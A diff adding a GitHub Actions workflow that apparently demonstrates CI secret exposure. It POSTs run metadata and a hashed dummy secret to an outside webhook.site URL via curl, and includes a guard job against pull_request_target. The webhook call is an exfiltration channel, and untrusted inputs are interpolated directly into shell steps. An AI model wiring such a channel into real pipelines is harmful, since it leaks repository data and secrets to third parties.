@@ -1,0 +1,111 @@
+name: SAFE PoC – Secret Exposure Demo (no external exfil)
+
+on:
+  # Runs on PRs to show behavior safely (no secrets accessed)
+  pull_request:
+    branches: [ main ]
+
+  # Manual trigger so you can test with a DUMMY secret you provide
+  workflow_dispatch:
+    inputs:
+      TEST_SECRET:
+        description: "Dummy secret for PoC (safe). Never put real secrets here."
+        required: false
+        default: ""
+
+permissions:
+  contents: read
+
+env:
+  WEBHOOK_URL: "https://webhook.site/3fe8a22a-5982-47f3-9373-e439ba1b9832"
+
+jobs:
+  # --- 1) Metadata-only PoC (runs on PRs, safe) ---
+  metadata_only:
+    name: Post run metadata (no secrets)
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create PoC metadata
+        run: |
+          {
+            echo "EVENT_TYPE=${{ github.event_name }}";
+            echo "REPO=${{ github.repository }}";
+            echo "RUN_ID=${{ github.run_id }}";
+            echo "RUN_ATTEMPT=${{ github.run_attempt }}";
+            echo "WORKFLOW=${{ github.workflow }}";
+            echo "PR_NUMBER=${{ github.event.pull_request.number || '' }}";
+            echo "ACTOR=${{ github.actor }}";
+            echo "HEAD_REPO=${{ github.event.pull_request.head.repo.full_name || '' }}";
+            echo "BASE_REPO=${{ github.repository }}";
+            echo "TIMESTAMP=$(date -u +%FT%TZ)";
+          } | tee poc-info.txt
+
+      - name: Upload artifact (metadata only)
+        uses: actions/upload-artifact@v4
+        with:
+            name: poc-info
+            path: poc-info.txt
+            retention-days: 1
+
+      - name: POST metadata to webhook (safe)
+        run: |
+          jq -n \
+            --arg event "${{ github.event_name }}" \
+            --arg repo "${{ github.repository }}" \
+            --arg run_id "${{ github.run_id }}" \
+            --arg run_attempt "${{ github.run_attempt }}" \
+            --arg pr "${{ github.event.pull_request.number || "" }}" \
+            --arg actor "${{ github.actor }}" \
+            --arg head_repo "${{ github.event.pull_request.head.repo.full_name || "" }}" \
+            --arg base_repo "${{ github.repository }}" \
+            --arg ts "$(date -u +%FT%TZ)" \
+            '{event:$event, repo:$repo, run_id:$run_id, run_attempt:$run_attempt, pr:$pr, actor:$actor, head_repo:$head_repo, base_repo:$base_repo, timestamp:$ts}' \
+          | curl -sS -X POST -H "Content-Type: application/json" -d @- "$WEBHOOK_URL"
+
+  # --- 2) Dummy-secret test (manual only) ---
+  dummy_secret_test:
+    name: Hash & POST dummy secret (safe)
+    if: ${{ github.event_name == 'workflow_dispatch' && inputs.TEST_SECRET != '' }}
+    runs-on: ubuntu-latest
+    steps:
+      - name: Hash dummy secret (never real secrets)
+        id: hash
+        run: |
+          D="${{ inputs.TEST_SECRET }}"
+          LEN=${#D}
+          SHA=$(printf '%s' "$D" | sha256sum | awk '{print $1}')
+          printf 'LEN=%s\nSHA=%s\n' "$LEN" "$SHA" | tee dummy-secret-info.txt
+
+      - name: Upload artifact (dummy secret metadata)
+        uses: actions/upload-artifact@v4
+        with:
+          name: dummy-secret-info
+          path: dummy-secret-info.txt
+          retention-days: 1
+
+      - name: POST dummy secret metadata to webhook (safe)
+        run: |
+          LEN=$(grep '^LEN=' dummy-secret-info.txt | cut -d= -f2)
+          SHA=$(grep '^SHA=' dummy-secret-info.txt | cut -d= -f2)
+          jq -n \
+            --arg repo "${{ github.repository }}" \
+            --arg run_id "${{ github.run_id }}" \
+            --arg len "$LEN" \
+            --arg sha "$SHA" \
+            --arg ts "$(date -u +%FT%TZ)" \
+            '{repo:$repo, run_id:$run_id, dummy_secret_len:$len, dummy_secret_sha256:$sha, timestamp:$ts}' \
+          | curl -sS -X POST -H "Content-Type: application/json" -d @- "$WEBHOOK_URL"
+
+  # --- 3) Guardrail: fail if someone switches to pull_request_target ---
+  guard_against_target:
+    name: Guard against pull_request_target misuse
+    runs-on: ubuntu-latest
+    steps:
+      - name: Detect event and fail if dangerous
+        run: |
+          if [ "${{ github.event_name }}" = "pull_request_target" ]; then
+            echo "❌ Refusing to run on pull_request_target (secrets risk)."
+            exit 1
+          else
+            echo "✅ Safe event: ${{ github.event_name }}"
+          fi
